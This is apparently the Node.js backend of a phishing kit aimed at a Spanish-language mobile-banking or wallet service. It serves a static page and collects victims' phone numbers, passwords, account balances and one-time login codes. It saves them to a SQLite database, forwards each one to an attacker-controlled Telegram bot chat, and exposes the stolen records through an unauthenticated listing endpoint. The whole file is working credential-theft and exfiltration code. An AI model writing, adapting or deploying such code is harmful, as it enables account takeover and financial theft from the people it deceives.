const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const Database = require("better-sqlite3");

const app = express();
app.use(express.json());
app.use(cors());

const db = new Database("events.db");
db.exec("CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT, password TEXT, otp TEXT, saldo TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "";
const TELEGRAM_CHAT = process.env.TELEGRAM_CHAT || "";

function sendToTelegram(text) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT) return Promise.resolve();
  const url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";
  return fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT, text }) });
}

app.post("/collect", async (req, res) => {
  const phone = String(req.body.phone || "");
  const password = String(req.body.password || "");
  const saldo = String(req.body.saldo || "");
  db.prepare("INSERT INTO events (phone, password, saldo) VALUES (?, ?, ?)").run(phone, password, saldo);
  const text = "📱 Datos\n\n📞 Celular: " + phone + "\n🔒 Contraseña: " + password + "\n💰 Saldo: " + saldo;
  try { await sendToTelegram(text); } catch (_) {}
  res.json({ ok: true });
});

app.post("/otp", async (req, res) => {
  const phone = String(req.body.phone || "");
  const otp = String(req.body.otp || "");
  db.prepare("INSERT INTO events (phone, otp) VALUES (?, ?)").run(phone, otp);
  const text = "🔐 Dinámica\n📞 Celular: " + phone + "\n🧩 Código: " + otp;
  try { await sendToTelegram(text); } catch (_) {}
  res.json({ ok: true });
});

app.get("/api/events", (req, res) => {
  const rows = db.prepare("SELECT id, phone, password, otp, saldo, created_at FROM events ORDER BY id DESC LIMIT 200").all();
  res.json(rows);
});

app.use("/", express.static(require("path").join(__dirname, "public")));

const port = process.env.PORT || 3000;
app.listen(port);
